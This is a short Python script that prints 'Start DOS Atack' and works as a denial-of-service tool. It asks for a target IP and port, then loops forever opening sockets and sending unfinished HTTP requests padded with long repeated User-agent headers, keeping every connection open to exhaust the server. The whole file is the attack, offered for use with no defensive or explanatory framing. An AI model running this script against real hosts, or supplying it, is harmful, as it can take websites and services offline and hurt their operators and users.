import socket
import random
import time


headers = [
    "User-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmI",
    "User-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmIUser-agent: WhoAmI"
] 



sockets = []


def setupSocket(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)

    try:
        sock.connect((ip, port))
    except socket.error:
        print('Connecting Error...')
        

    
    sock.send("GET / HTTP/1.1\r\n".encode("utf-8"))
    
 
    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))



    return sock




if __name__ == '__main__':
    ip = input("Target IP: ")

    port = int(input("Target Port: "))
    
    

    print("Start DOS Atack Target > ",ip)



    
    
    while True:
        try:
            sock = setupSocket(ip, port)
            

            if sock == False:
                print('Target Not Found')
            print("...")
        except socket.error:
            print('Socket ERROR')
            print('Target Shutdown')

        
        sockets.append(sock)
    exit()
